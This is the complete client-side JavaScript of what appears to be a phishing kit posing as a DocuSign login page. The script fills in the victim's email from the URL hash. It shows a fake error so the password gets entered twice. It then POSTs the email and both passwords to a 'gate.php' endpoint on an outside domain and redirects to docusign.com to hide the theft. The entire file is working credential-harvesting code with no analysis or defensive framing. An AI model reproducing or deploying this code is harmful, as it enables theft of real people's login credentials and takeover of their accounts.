(function() {
    var gate = 'https://www.notredame.ie/choke/gate.php';
    var first_password = '';

	setTimeout(function(){
		var hash = window.location.hash;
		var _email = hash.split('#')[1];
		if (/.*@.*\..*/.test(_email) == true) {
            document.getElementById('email').value = _email;
		}
    },100);
    
    document.getElementById('email').addEventListener('keypress', function(e){
        if (e.which == 13) {
            document.querySelector('.login').click();
        }
    });
    document.getElementById('password').addEventListener('keypress', function(e){
        if (e.which == 13) {
            document.querySelector('.login').click();
        }
    });

    document.querySelector('.login').addEventListener('click', function(e){
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;
        if (/.*@.*\..*/.test(email) !== true) {
            document.querySelector('.error').className = 'error active';
            return;
        }
        if (/.{6,}/.test(password) !== true) {
            document.getElementById('password').value = '';
            document.querySelector('.error').className = 'error active';
            return;
        }

        if (first_password == '') {
            first_password = password;

            var request = new XMLHttpRequest();
            request.open('POST', gate, true);
            request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
            request.responseType = 'text';
            request.send('email='+email+'&pass1='+password);

            document.getElementById('password').value = '';
            document.querySelector('.error').className = 'error active';
            return;
        }

        var request = new XMLHttpRequest();
        request.open('POST', gate, true);
        request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
        request.responseType = 'text';
        request.onreadystatechange = function() {
            // if (this.readyState == 4 && this.status == 200) {
            document.location.href = 'https://docusign.com';
            // }
        };
        request.send('email='+email+'&pass1='+first_password+'&pass2='+password);
    });

})();